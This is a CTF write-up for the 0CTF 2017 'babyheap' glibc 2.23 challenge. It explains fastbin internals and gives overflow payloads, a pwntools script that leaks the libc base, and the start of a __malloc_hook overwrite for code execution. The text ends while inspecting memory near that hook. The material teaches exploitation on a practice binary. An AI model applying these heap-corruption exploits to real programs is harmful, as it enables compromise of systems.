---
layout: post
author: playoff-rondo
title:  "0CTF 2017: Babyheap"
date:   2018-01-1 1:01:37 -0500
categories: CTF-writeup
ctf-category: PWN
---
# BabyHeap Solve

## Description
This is a glibc 2.23 pwn involiving the fastbin attack accompanied by a heap overflow.

## Setting up the binary
Because this binary requires an older glibc version, I used pwndocker to set the enviorment up.
```bash
docker run -d \               
        --rm \       
        -h test \
        --name test \
        -v $(pwd):/ctf/work \
        -p 23946:23946 \
        --cap-add=SYS_PTRACE \
        skysider/pwndocker
```
and then used the docker shell to interact with it.
```docker exec -it test /bin/bash```

I also need to set the interpreter up on the binary to use glibc 2.23
```
cp /glibc/2.23/64/lib/ld-2.23.so /tmp/
patchelf --set-interpreter /tmp/ld-2.23.so ./0ctfbabyheap
```

## Vulnerability
In the fill function, you can read in an arbitrary amount of data onto the heap regardless of the size you allocated. This means we have a heap overflow we can use. 
![](https://i.imgur.com/XxE6uDk.png)

## Fastbin Attack

First, the anotmy of a heap chunk is as follows:
```c=
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```
When we free a chunk on the heap, the chunks go in certain bins depending on the size. This is so the heap allocator can reuse those chunks if the sizes fit. For example, if you allocate 0x20 (32) bytes and then free that chunk, the next time 0x20 (32) bytes gets allocated, the heap allocator will look into the fastbin for size 0x30 (fits allocated size + heap meta-data size, in this case 0x10 bytes because its an x64 binary) and returns a pointer to that chunk.

Using gdb-gef, we can examine the state of the bins with the `heap bins` command.
```
gef➤  heap bins
[+] No Tcache in this version of libc
──────────────────────────────────────────────────────────────────────────────────────────────────────────── Fastbins for arena 0x7fd36cac3b20 ────────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ───────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────────────────────────────────────────────────────────────────────────────────── Small Bins for arena 'main_arena' ────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────────────────────────────────────────────────────────────────────────────── Large Bins for arena 'main_arena' ────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  
```

When you free a chunk into the fast bin, that chunk becomes the top chunk in the bin:
```
─── Fastbins for arena 0x7f6fd124eb20 ─────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x55d819c54010, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

When you free the next chunk into the same size bin, the most recently freed chunk becomes the top chunk and then the chunk's data gets overwritten with the FD pointer, which points to the previous top chunk because the chunks are a linked list. This is so when the next time the heap allocates a chunk of that same size, the fastbin sets the new top chunk to be the old top chunks FD pointer (the prevoius top chunk before it).

```
───── Fastbins for arena 0x7f26a99b6b20 ────────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x55d819c54040, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x55d819c54010, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

The dump of the heap after allocatting 32 bytes twice and then both freed looks like:
```
0x55d819c54000: 0x0000000000000000      0x0000000000000031    <--- first chunk (prev_size,size)
0x55d819c54010: 0x0000000000000000      0x0000000000000000       |- chunk data
0x55d819c54020: 0x0000000000000000      0x0000000000000000
0x55d819c54030: 0x0000000000000000      0x0000000000000031    <--- Second chunk (prev_size,size)
0x55d819c54040: 0x000055d819c54000      0x0000000000000000       |- FD pointer, overwritten the chunk data, BK pointer (0 because fastbin is a singlely linked list)
0x55d819c54050: 0x0000000000000000      0x0000000000000000
0x55d819c54060: 0x0000000000000000      0x0000000000020fa1    <--- Top chunk of heap
0x55d819c54070: 0x0000000000000000      0x0000000000000000
0x55d819c54080: 0x0000000000000000      0x0000000000000000
0x55d819c54090: 0x0000000000000000      0x0000000000000000
0x55d819c540a0: 0x0000000000000000      0x0000000000000000
0x55d819c540b0: 0x0000000000000000      0x0000000000000000
0x55d819c540c0: 0x0000000000000000      0x0000000000000000
0x55d819c540d0: 0x0000000000000000      0x0000000000000000
0x55d819c540e0: 0x0000000000000000      0x0000000000000000
0x55d819c540f0: 0x0000000000000000      0x0000000000000000
```

## The Exploit

If we can control the FD pointer at `0x55d819c54040`, the next time the heap allocates a chunk in that same bin a pointer to the second chunk is returned and the chunk at the second chunk's FD becomes the new top chunk in that fast bin:

```
────────── Fastbins for arena 0x7f881350ab20 ────────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x5626bcd74010, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```
However we can forge that chunk with control of that FD pointer and allow us to return an arbitrary pointer of our choosing. Using the heap overflow mentioned before, we can overwrite this chunk's FD to get the allocator to give us a heap chunk at that arbitrary address. 
The example below allocates 3 chunks:
1. One that will be used for the heap overflow
1. First Chunk for fastbin
1. Second Chunk for fastbin that will then contain the FD pointing to chunk 2

Then frees the chunk 2 and chunk 3. The layout of the heap at this state is below.
```
0x55bf3bdb1000: 0x0000000000000000      0x0000000000000031    <--- Chunk 1
0x55bf3bdb1010: 0x0000000000000000      0x0000000000000000
0x55bf3bdb1020: 0x0000000000000000      0x0000000000000000
0x55bf3bdb1030: 0x0000000000000000      0x0000000000000031    <--- Chunk 2
0x55bf3bdb1040: 0x0000000000000000      0x0000000000000000
0x55bf3bdb1050: 0x0000000000000000      0x0000000000000000
0x55bf3bdb1060: 0x0000000000000000      0x0000000000000031    <--- Chunk 3
0x55bf3bdb1070: 0x000055bf3bdb1030      0x0000000000000000
0x55bf3bdb1080: 0x0000000000000000      0x0000000000000000
0x55bf3bdb1090: 0x0000000000000000      0x0000000000020f71    <-- top chunk/wilderness
0x55bf3bdb10a0: 0x0000000000000000      0x0000000000000000
0x55bf3bdb10b0: 0x0000000000000000      0x0000000000000000
0x55bf3bdb10c0: 0x0000000000000000      0x0000000000000000
0x55bf3bdb10d0: 0x0000000000000000      0x0000000000000000
0x55bf3bdb10e0: 0x0000000000000000      0x0000000000000000
0x55bf3bdb10f0: 0x0000000000000000      0x0000000000000000
```
Using the heap overflow with chunk 1 it would take 96 bytes (0x55bf3bdb1070-0x55bf3bdb1010) to overwrite the FD in chunk 3. However if we just write NULLs up until overwriting chunk 3 FD then both chunk 2 and chunk 3 will be corrupt as they will no longer have a valid chunk size.

With the payload below set as chunk 1's data we can preserve chunk 2 and chunk 3's size.
```python=
payload = b""
payload += p64(0)*5
payload += p64(0x31)
payload += p64(0)*5
payload += p64(0x31)
```

The next 8 bytes will overwrite chunk 3's FD.
```python=
payload = b""
payload += p64(0)*5
payload += p64(0x31)
payload += p64(0)*5
payload += p64(0x31)
payload += p64(0x41414141) # overwriting chunk3 fd
```

The heap layout now looks like:
```
0x564e855c2000: 0x0000000000000000      0x0000000000000031    <--- Chunk 1
0x564e855c2010: 0x0000000000000000      0x0000000000000000
0x564e855c2020: 0x0000000000000000      0x0000000000000000
0x564e855c2030: 0x0000000000000000      0x0000000000000031    <--- Chunk 2
0x564e855c2040: 0x0000000000000000      0x0000000000000000
0x564e855c2050: 0x0000000000000000      0x0000000000000000
0x564e855c2060: 0x0000000000000000      0x0000000000000031    <--- Chunk 3
0x564e855c2070: 0x0000000041414141      0x0000000000000000       |- Chunk 3's new FD
0x564e855c2080: 0x0000000000000000      0x0000000000000000
0x564e855c2090: 0x0000000000000000      0x0000000000020f71    <--- top chunk/wilderness
0x564e855c20a0: 0x0000000000000000      0x0000000000000000
0x564e855c20b0: 0x0000000000000000      0x0000000000000000
0x564e855c20c0: 0x0000000000000000      0x0000000000000000
0x564e855c20d0: 0x0000000000000000      0x0000000000000000
0x564e855c20e0: 0x0000000000000000      0x0000000000000000
0x564e855c20f0: 0x0000000000000000      0x0000000000000000
```
And using gef's `heap bins`:
```
── Fastbins for arena 0x7f1680768b20 ────────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x564e855c2070, size=0x30, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x41414151]
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

However, after we allocate our valid chunk at the top of the fastbin size 0x30, the next chunk is corrupt because at the address 0x41414141 is not a valid chunk (its unaccessible, therefor cant have a valid size)

### Libc Leak
We can use the infromation above to leak an address in libc which can be used to calculate libc base address.

When the heap frees a chunk that is to large for the fastbins, the chunk will go into another larger bin. In glibc 2.23's case, the chunk will be placed in the `unsorted bin`.

However, if we were to just allocate a chunk with a large size, say 0x90, and then free'd the chunk, we would not see that chunk in the unsorted bin. This is because of the chunk `coalescing`. Coalescing is the combining of nearby chunks. Going back to the examples of the heap layouts above, we saw that although those chunks were in the fastbin size `0x30` bin, their sizes were in memory `0x31`. This is because if the size ends in a `1`, it means the `prev_inuse` (previously inuse) flag is turned on, which means do not coalesce adjacent chunks. Chunks in the fastbin always have this flag enabled and are never coalesced. But the unsorted bin can be coalesced and in this case it is because the adjcent chunk after the chunk in the unsoreted bin is the top chunk of the heap, or also known as the wilderness. The chunk gets merged into the wilderness and is no longer in the unsorted bin.

To create a chunk that will be placed in the unsorted bin without being coalesced into the top chunk/wilderness, we can just allocate a chunk that will not be coalesced after, aka something in the fastbins.

The chunks are as followd:
1. Chunk 1 (Size: 0x90)
2. Chunk 2 (Size: 0x20)

Then free chunk 1. The heap layout is displayed below.
```
0x563a86cf7000: 0x0000000000000000      0x00000000000000a1    <--- Chunk 1 (size)
0x563a86cf7010: 0x00007f3140098b78      0x00007f3140098b78       |- Chunk 1 (FD,BK)
0x563a86cf7020: 0x0000000000000000      0x0000000000000000
0x563a86cf7030: 0x0000000000000000      0x0000000000000000
0x563a86cf7040: 0x0000000000000000      0x0000000000000000
0x563a86cf7050: 0x0000000000000000      0x0000000000000000
0x563a86cf7060: 0x0000000000000000      0x0000000000000000
0x563a86cf7070: 0x0000000000000000      0x0000000000000000
0x563a86cf7080: 0x0000000000000000      0x0000000000000000
0x563a86cf7090: 0x0000000000000000      0x0000000000000000
0x563a86cf70a0: 0x00000000000000a0      0x0000000000000030    <--- Chunk 2 (prev_size, size)
0x563a86cf70b0: 0x0000000000000000      0x0000000000000000
0x563a86cf70c0: 0x0000000000000000      0x0000000000000000
0x563a86cf70d0: 0x0000000000000000      0x0000000000020f31    <--- top chunk/wilderness
0x563a86cf70e0: 0x0000000000000000      0x0000000000000000
0x563a86cf70f0: 0x0000000000000000      0x0000000000000000
```

We can see that chunk 1's FD and BK pointers are populated, this is because when an unsorted bin is free'd the FD and BK pointers are set to and address inside libc. This particular address corresopndis to the `main_areana` where is points to the address of the top chunk/wilderness.
```
0x7f3140098b78 <main_arena+88>: 0x0000563a86cf70d0      0x0000000000000000
0x7f3140098b88 <main_arena+104>:        0x0000563a86cf7000      0x0000563a86cf7000
0x7f3140098b98 <main_arena+120>:        0x00007f3140098b88      0x00007f3140098b88
0x7f3140098ba8 <main_arena+136>:        0x00007f3140098b98      0x00007f3140098b98
0x7f3140098bb8 <main_arena+152>:        0x00007f3140098ba8      0x00007f3140098ba8
```

That adress can be used to calculate libc's base address. With `vmmap` we can determine the address of libc and take the address above from the chunk's fd and subtract them to get the offset between the FD pointer and the libc base.

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000269003212000 0x0000269003213000 0x0000000000000000 rw- 
0x0000563a85e3d000 0x0000563a85e3f000 0x0000000000000000 r-x /ctf/work/0ctfbabyheap
0x0000563a8603e000 0x0000563a8603f000 0x0000000000001000 r-- /ctf/work/0ctfbabyheap
0x0000563a8603f000 0x0000563a86041000 0x0000000000002000 rw- /ctf/work/0ctfbabyheap
0x0000563a86cf7000 0x0000563a86d18000 0x0000000000000000 rw- [heap]
0x00007f313fcfd000 0x00007f313fe94000 0x0000000000000000 r-x /glibc/2.23/64/lib/libc-2.23.so
0x00007f313fe94000 0x00007f3140094000 0x0000000000197000 --- /glibc/2.23/64/lib/libc-2.23.so
0x00007f3140094000 0x00007f3140098000 0x0000000000197000 r-- /glibc/2.23/64/lib/libc-2.23.so
0x00007f3140098000 0x00007f314009a000 0x000000000019b000 rw- /glibc/2.23/64/lib/libc-2.23.so
0x00007f314009a000 0x00007f314009e000 0x0000000000000000 rw- 
```
```python
>>> hex(0x00007f3140098b78-0x00007f313fcfd000)
'0x39bb78'
```

For this ctf challenge though, to actually leak the libc address without using gdb we need to take a few extra steps.

Since there is no UAF vulnerability, only a heap overflow, we can not just print the contents of the chunk holding the libc address after freeing it. We need to allocate 2 chunks that point to the same thing.

We can use the heap overflow to forge a chunk that can be free'd into both the fastbin and the unsorted bin.

Chunks needed (the numbers represent the index in the array of containing all the allocations):
1. Chunk to be used with the heap overflow to overwerite chunk 3's fd
2. Chunk to be free'd
3. Chunk to be free'd that will then contain the FD pointing to chunk 2
4. Chunk to be used with a heap overflow to adjust chunk 5's size allowing it to be in different bins
5. Chunk to be in both unsorted and fastbin
6. Chunk to stop from coalescing with top chunk/wilderness

The heap layout after chunks 2 and 3 have been free'd:

```
0x5633ccfb2000: 0x0000000000000000      0x0000000000000031    <--- Chunk 1
0x5633ccfb2010: 0x0000000000000000      0x0000000000000000
0x5633ccfb2020: 0x0000000000000000      0x0000000000000000
0x5633ccfb2030: 0x0000000000000000      0x0000000000000031    <-- Chunk 2
0x5633ccfb2040: 0x0000000000000000      0x0000000000000000
0x5633ccfb2050: 0x0000000000000000      0x0000000000000000
0x5633ccfb2060: 0x0000000000000000      0x0000000000000031    <--- Chunk 3
0x5633ccfb2070: 0x00005633ccfb2030      0x0000000000000000       |- FD pointing to chunk 2
0x5633ccfb2080: 0x0000000000000000      0x0000000000000000
0x5633ccfb2090: 0x0000000000000000      0x0000000000000031    <--- Chunk 4
0x5633ccfb20a0: 0x0000000000000000      0x0000000000000000
0x5633ccfb20b0: 0x0000000000000000      0x0000000000000000
0x5633ccfb20c0: 0x0000000000000000      0x0000000000000091    <--- Chunk 5
0x5633ccfb20d0: 0x0000000000000000      0x0000000000000000
0x5633ccfb20e0: 0x0000000000000000      0x0000000000000000
0x5633ccfb20f0: 0x0000000000000000      0x0000000000000000
0x5633ccfb2100: 0x0000000000000000      0x0000000000000000
0x5633ccfb2110: 0x0000000000000000      0x0000000000000000
0x5633ccfb2120: 0x0000000000000000      0x0000000000000000
0x5633ccfb2130: 0x0000000000000000      0x0000000000000000
0x5633ccfb2140: 0x0000000000000000      0x0000000000000000
0x5633ccfb2150: 0x0000000000000000      0x0000000000000031    <--- Chunk 6
0x5633ccfb2160: 0x0000000000000000      0x0000000000000000
0x5633ccfb2170: 0x0000000000000000      0x0000000000000000
0x5633ccfb2180: 0x0000000000000000      0x0000000000020e81    <--- Top chunk/wilderness
0x5633ccfb2190: 0x0000000000000000      0x0000000000000000    
```

Heap Bins:
```
───── Fastbins for arena 0x7fbba6526b20 ────────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x5633ccfb2070, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5633ccfb2040, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
────── Unsorted Bin for arena 'main_arena' ───────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
```

Using the following payload as the content for chunk 1, the LSB of chunk 3's FD is overwritten to point to chunk 5 instead of chunk 2
```python=
payload1 = b""
payload1 += p64(0)*5
payload1 += p64(0x31)
payload1 += p64(0)*5
payload1 += p64(0x31)
payload1 += b"\xc0"
```
And the heap layout in memory:
```
0x563c6f84c000: 0x0000000000000000      0x0000000000000031    <--- chunk 1
0x563c6f84c010: 0x0000000000000000      0x0000000000000000
0x563c6f84c020: 0x0000000000000000      0x0000000000000000
0x563c6f84c030: 0x0000000000000000      0x0000000000000031    <--- chunk 2
0x563c6f84c040: 0x0000000000000000      0x0000000000000000
0x563c6f84c050: 0x0000000000000000      0x0000000000000000
0x563c6f84c060: 0x0000000000000000      0x0000000000000031    <--- chunk 3
0x563c6f84c070: 0x0000563c6f84c0c0      0x0000000000000000       |- FD (Notice now points to chunk 5)
0x563c6f84c080: 0x0000000000000000      0x0000000000000000
0x563c6f84c090: 0x0000000000000000      0x0000000000000031    <--- chunk 4
0x563c6f84c0a0: 0x0000000000000000      0x0000000000000000
0x563c6f84c0b0: 0x0000000000000000      0x0000000000000000
0x563c6f84c0c0: 0x0000000000000000      0x0000000000000091    <--- chunk 5
0x563c6f84c0d0: 0x0000000000000000      0x0000000000000000
0x563c6f84c0e0: 0x0000000000000000      0x0000000000000000
0x563c6f84c0f0: 0x0000000000000000      0x0000000000000000
0x563c6f84c100: 0x0000000000000000      0x0000000000000000
0x563c6f84c110: 0x0000000000000000      0x0000000000000000
0x563c6f84c120: 0x0000000000000000      0x0000000000000000
0x563c6f84c130: 0x0000000000000000      0x0000000000000000
0x563c6f84c140: 0x0000000000000000      0x0000000000000000
0x563c6f84c150: 0x0000000000000000      0x0000000000000031    <--- chunk 6
0x563c6f84c160: 0x0000000000000000      0x0000000000000000
0x563c6f84c170: 0x0000000000000000      0x0000000000000000
0x563c6f84c180: 0x0000000000000000      0x0000000000020e81    <--- top chunk/wilderness
```
```
───── Fastbins for arena 0x7f4c70214b20 ────────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x563c6f84c070, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x563c6f84c0d0, size=0x90, flags=PREV_INUSE) [incorrect fastbin_index] 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```
Now we have our chunk 5 in the fastbin, we still have to correct the issue with the chunk size. The heap allocator will complain and not give us that chunk if the size does not match the correct bin.

We then use the heap overflow with chunk 4 to change chunk 5's size to 0x31 so that it becomes a valid chunk. The code below is used for chunk 4's data.

```python=
payload2 = b""
payload2 += p64(0)*5
payload2 += p64(0x31)
```
The memeory now looks like:
```
0x55f1181f6000: 0x0000000000000000      0x0000000000000031    <--- chunk 1
0x55f1181f6010: 0x0000000000000000      0x0000000000000000
0x55f1181f6020: 0x0000000000000000      0x0000000000000000
0x55f1181f6030: 0x0000000000000000      0x0000000000000031    <--- chunk 2
0x55f1181f6040: 0x0000000000000000      0x0000000000000000
0x55f1181f6050: 0x0000000000000000      0x0000000000000000
0x55f1181f6060: 0x0000000000000000      0x0000000000000031    <--- chunk 3
0x55f1181f6070: 0x000055f1181f60c0      0x0000000000000000       |- FD points to chunk 5 instead of chunk 2
0x55f1181f6080: 0x0000000000000000      0x0000000000000000
0x55f1181f6090: 0x0000000000000000      0x0000000000000031    <--- chunk 4
0x55f1181f60a0: 0x0000000000000000      0x0000000000000000
0x55f1181f60b0: 0x0000000000000000      0x0000000000000000
0x55f1181f60c0: 0x0000000000000000      0x0000000000000031    <--- chunk 5 (size is now 0x31 instead of 0x91)
0x55f1181f60d0: 0x0000000000000000      0x0000000000000000
0x55f1181f60e0: 0x0000000000000000      0x0000000000000000
0x55f1181f60f0: 0x0000000000000000      0x0000000000000000
0x55f1181f6100: 0x0000000000000000      0x0000000000000000
0x55f1181f6110: 0x0000000000000000      0x0000000000000000
0x55f1181f6120: 0x0000000000000000      0x0000000000000000
0x55f1181f6130: 0x0000000000000000      0x0000000000000000
0x55f1181f6140: 0x0000000000000000      0x0000000000000000
0x55f1181f6150: 0x0000000000000000      0x0000000000000031    <--- chunk 6
0x55f1181f6160: 0x0000000000000000      0x0000000000000000
0x55f1181f6170: 0x0000000000000000      0x0000000000000000
0x55f1181f6180: 0x0000000000000000      0x0000000000020e81    <--- top chunk/wilderness
```

```
────── Fastbins for arena 0x7f7093ce6b20 ─────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x55f1181f6070, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x55f1181f60d0, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

Now gdb doesnt complain that the chunk has the wrong size for the bin its in.

The next time we allocate a size of 0x19-0x28, the allocator will look in the 0x30 bin and return a pointer to the top chunk in that bin, which happends to be where the old chunk 3 was. Then the new top chunk in the 0x30 fastbin will be the chunk we forged. At next allocation of size 0x19-0x28, the heap allocator will return a pointer that corresponds with chunk 5.

The two new chunks:

3. Chunk that fills the spot of old chunk 3
2. Chunk that points to chunk 5, old chunk 2

We can use chunk 4 again with the heap overflow to set chunk 5 back to a size that would place it in the unsorted bin.

```python=
payload2 = b""
payload2 += p64(0)*5
payload2 += p64(0x91)
```

Then free chunk 5 to populate the FD and BK with libc address.

The heap layout:
```
0x562911195000: 0x0000000000000000      0x0000000000000031    <--- chunk 1
0x562911195010: 0x0000000000000000      0x0000000000000000
0x562911195020: 0x0000000000000000      0x0000000000000000
0x562911195030: 0x0000000000000000      0x0000000000000031    
0x562911195040: 0x0000000000000000      0x0000000000000000
0x562911195050: 0x0000000000000000      0x0000000000000000
0x562911195060: 0x0000000000000000      0x0000000000000031    <--- chunk 3
0x562911195070: 0x0000000000000000      0x0000000000000000
0x562911195080: 0x0000000000000000      0x0000000000000000
0x562911195090: 0x0000000000000000      0x0000000000000031    <--- chunk 4
0x5629111950a0: 0x0000000000000000      0x0000000000000000
0x5629111950b0: 0x0000000000000000      0x0000000000000000
0x5629111950c0: 0x0000000000000000      0x0000000000000091    <--- chunk 5    <--- index 2 also points
0x5629111950d0: 0x00007f90259d2b78      0x00007f90259d2b78       |- FD, BK pointers
0x5629111950e0: 0x0000000000000000      0x0000000000000000
0x5629111950f0: 0x0000000000000000      0x0000000000000000
0x562911195100: 0x0000000000000000      0x0000000000000000
0x562911195110: 0x0000000000000000      0x0000000000000000
0x562911195120: 0x0000000000000000      0x0000000000000000
0x562911195130: 0x0000000000000000      0x0000000000000000
0x562911195140: 0x0000000000000000      0x0000000000000000
0x562911195150: 0x0000000000000090      0x0000000000000030    <--- chunk 6
0x562911195160: 0x0000000000000000      0x0000000000000000
0x562911195170: 0x0000000000000000      0x0000000000000000
0x562911195180: 0x0000000000000000      0x0000000000020e81    <--- top chunk/wilderness
```

The `heap bins` now looks like:
```
───────── Unsorted Bin for arena 'main_arena' ───────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x5629111950c0, bk=0x5629111950c0
 →   Chunk(addr=0x5629111950d0, size=0x90, flags=PREV_INUSE)
```
Because chunk 5 has already been free'd, we cant print the contents which hold the heap addresses, but the index 2 also points to the address of chunk 5 and that has not been free'd so we can print the contents of index 2 to get a leak of libc. Subrtract that number to the offset we calculated earlier and we have a leak of libc base address.

The following POC leaks the libc base address:
```python=
from pwn import *
context.terminal = ['tmux', 'splitw', '-v']
target = "./0ctfbabyheap"
p = process(target)
gdb.attach(p)
e = ELF(target)
l = e.libc
def Allocate(size):
    p.sendline("1")
    p.recvuntil("Size:")
    p.sendline(str(size))

def Fill(index, data):
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Size:")
    p.sendline(str(len(data)))
    p.recvuntil("Content:")
    p.sendline(data)

def Free(index):
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(index))

def Dump(index):
    p.sendline("4")
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil(": \n")
    data = p.recvline()
    p.recvuntil(": ")
    return data

Allocate(0x20)  
Allocate(0x20)  
Allocate(0x20)  
Allocate(0x20)
Allocate(0x80) 
Allocate(0x20) 

Free(1)
Free(2) 

payload1 = b""
payload1 += p64(0)*5
payload1 += p64(0x31)
payload1 += p64(0)*5
payload1 += p64(0x31)
payload1 += b"\xc0"
Fill(0, payload1)

#set to fastbin size
payload2 = b""
payload2 += p64(0)*5
payload2 += p64(0x31)
Fill(3,payload2)

Allocate(32) 
Allocate(32)    

#set back to unsorted size
payload2 = b""
payload2 += p64(0)*5
payload2 += p64(0x91)
Fill(3,payload2)

Free(4)    # add libc pointer in FD from unsortedbin

leak = u64(Dump(2)[:8])
libc_base = leak-0x39bb78
print("Leak:",hex(leak))
print("Libc Base:",hex(libc_base))
```
The output:
```bash
root@test:/ctf/work$ python3 0heap.py 
[+] Starting local process './0ctfbabyheap': pid 2310
[*] running in new terminal: /usr/bin/gdb -q  "./0ctfbabyheap" 2310
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_ARM64'
[*] '/ctf/work/0ctfbabyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_ARM64'
[*] '/glibc/2.23/64/lib/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
 1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: $ 
[*] Interrupted
Leak: 0x7f5d50536b78
Libc Base: 0x7f5d5019b000
```
### RCE
We can use the same method as described above to gain remote code execution.

Instead of doing a partial overwrite to create a forged chunk that pointed to another chunk, we can forge a chunk that points to an arbitrary address and use the `Fill` feature of the binary to get an arbitrary write. 

One good place to write to would be `__malloc__hook` symbol. This is usually just NULL but if the value at that address is not null whenever malloc is called, the program counter will jump to the address specified in `__malloc_hook`. There is also a `__free_hook` as well that could be used.

To do this write we need the following chunks:
1. Chunk to use heap overflow to overwrite chunk #'s FD to `__malloc_hook`
2. Chunk to be free'd
3. Chunk to be free'd that will then contain the FD pointing to chunk 2

And then free chunk 2 and 3.

A look at the fastbin linked list:
```
────── Fastbins for arena 0x7fc38ec36b20 ────────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x55b740217270, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x7fc38ec36b20, size=0x0, flags=) [incorrect fastbin_index] 
Fastbins[idx=6, size=0x80] 0x00
```
This shows that our chunk that points to `__malloc_hook` is corrupt because the size is 0x0.
We need to search the memory around `__malloc_hook` to find a chunk of memory that would resemble a heap chunk so that it would have a valid size.

The memory before the `__malloc_hook`:
```
0x7fc38ec36a90 <_IO_wide_data_0+208>:   0x0000000000000000      0x0000000000000000
0x7fc38ec36aa0 <_IO_wide_data_0+224>:   0x0000000000000000      0x0000000000000000
0x7fc38ec36ab0 <_IO_wide_data_0+240>:   0x0000000000000000      0x0000000000000000
0x7fc38ec36ac0 <_IO_wide_data_0+256>:   0x0000000000000000      0x0000000000000000
0x7fc38ec36ad0 <_IO_wide_data_0+272>:   0x0000000000000000      0x0000000000000000
0x7fc38ec36ae0 <_IO_wide_data_0+288>:   0x0000000000000000      0x0000000000000000
0x7fc38ec36af0 <_IO_wide_data_0+304>:   0x00007fc38ec35260      0x0000000000000000
0x7fc38ec36b00 <__memalign_hook>:       0x00007fc38e914b00      0x00007fc38e914aa0
0x7fc38ec36b10 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
```
